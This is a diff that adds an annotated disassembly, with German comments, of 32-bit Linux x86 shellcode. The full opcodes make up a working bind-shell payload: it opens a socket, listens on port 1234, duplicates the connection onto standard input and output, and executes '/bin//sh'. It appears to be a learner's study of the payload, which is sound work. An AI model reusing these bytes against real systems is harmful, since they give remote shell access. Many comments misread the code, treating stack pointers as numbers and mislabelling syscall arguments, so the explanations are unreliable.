@@ -1,0 +1,44 @@
+.data:0x00000000	31db		xor    %ebx,%ebx	;%ebx = 0
+.data:0x00000002	f7e3		mul    %ebx			;multipliziere eax mit 0 -> %eax = 0 -> %edx = 0
+.data:0x00000004	53			push   %ebx			;push %ebx=0 auf den Stack
+.data:0x00000005	43			inc    %ebx			;inkrementiere %ebx => %ebx = 1
+.data:0x00000006	53			push   %ebx			;push das inkrementierte %ebx auf den Stack
+.data:0x00000007	6a02		push   $0x2			;push 2 auf den Stack   stack: 											[2][1][0]
+.data:0x00000009	89e1		mov    %esp,%ecx	;2 nach %ecx
+.data:0x0000000b	b066		mov    $0x66,%al	;102 nach %al (niedrigstes byte von %eax)
+.data:0x0000000d	cd80		int    $0x80		;Syscall (sys_socketcall) mit %ebx = 1(Socket) und %ecx = 2 (AF_INET)
+.data:0x0000000f	5b			pop    %ebx			;2 vom Stack nehmen und nach %ebx schreiben 							[1][0]
+.data:0x00000010	5e			pop    %esi			;1 vom Stack nehmen und nach %esi schreiben								[0]
+.data:0x00000011	52			push   %edx			;%edx = 0 auf Stack legen												[0][0]
+.data:0x00000012	68ff0204d2	push   $0xd20402ff	;3523478271 auf den Stack												[3523478271][0][0] 
+.data:0x00000017	6a10		push   $0x10		;10 auf den Stack 														[10][3523478271][0][0]
+.data:0x00000019	51			push   %ecx			;%ecx = 2 auf den Stack 												[2][10][3523478271][0][0]
+.data:0x0000001a	50			push   %eax			;%eax = 102 auf den Stack 												[102][2][10][3523478271][0][0]
+.data:0x0000001b	89e1		mov    %esp,%ecx	;%ecx = 102 
+.data:0x0000001d	6a66		push   $0x66		;102 auf den Stack 														[102][102][2][10][3523478271][0][0]
+.data:0x0000001f	58			pop    %eax			;102 nach %eax															[102][2][10][3523478271][0][0]
+.data:0x00000020	cd80		int    $0x80			;Syscall (sys_socketcall) mit %ebx = 2(Socket) und %ecx = 2 (AF_INET) 
+.data:0x00000022	894104		mov    %eax,0x4(%ecx)	;%eax = 102 nach %ecx = 106
+.data:0x00000025	b304		mov    $0x4,%bl			;%ebx = 4
+.data:0x00000027	b066		mov    $0x66,%al		;%eax = 102
+.data:0x00000029	cd80		int    $0x80			;Syscall (sys_socketcall) mit %ebx = 4(Socket) und %ecx = 106?
+.data:0x0000002b	43			inc    %ebx				;%ebx = 5
+.data:0x0000002c	b066		mov    $0x66,%al		;%eax = 102
+.data:0x0000002e	cd80		int    $0x80			;Syscall (sys_socketcall) mit %ebx = 5(Socket) und %ecx = 106?
+.data:0x00000030	93			xchg   %eax,%ebx		;tausche %eax und %ebx -> %eax = 5 und %ebx = 102
+.data:0x00000031	59			pop    %ecx				;102 nach %ecx 														[2][10][3523478271][0][0]
+.data:0x00000032			
+.data:0x00000032		loc_00000032:	
+.data:0x00000032	6a3f		push   $0x3f			;63 auf Stack
+.data:0x00000034	58			pop    %eax				;63 vom Stack nehmen und %eax = 63 
+.data:0x00000035	cd80		int    $0x80			;Syscall (duplicate file descriptor) ???? 
+.data:0x00000037	49			dec    %ecx				;dekrementiere %ecx
+.data:0x00000038	79f8		jns    loc_00000032		;Jump on no sign - Springe wenn %ecx positiv ist
+.data:0x0000003a	682f2f7368	push   $0x68732f2f		;1752379183 auf den Stack		
+.data:0x0000003f	682f62696e	push   $0x6e69622f		;1852400175 auf den Stack
+.data:0x00000044	89e3		mov    %esp,%ebx		;%ebx = 1852400175
+.data:0x00000046	50			push   %eax				;63 auf den Stack
+.data:0x00000047	53			push   %ebx				;102 auf den Stack
+.data:0x00000048	89e1		mov    %esp,%ecx		;%ecx = 102
+.data:0x0000004a	b00b		mov    $0xb,%al			;11 nach %eax
+.data:0x0000004c	cd80		int    $0x80 		;Syscall (sys_execve) %ebx = 1852400175 (file to run)
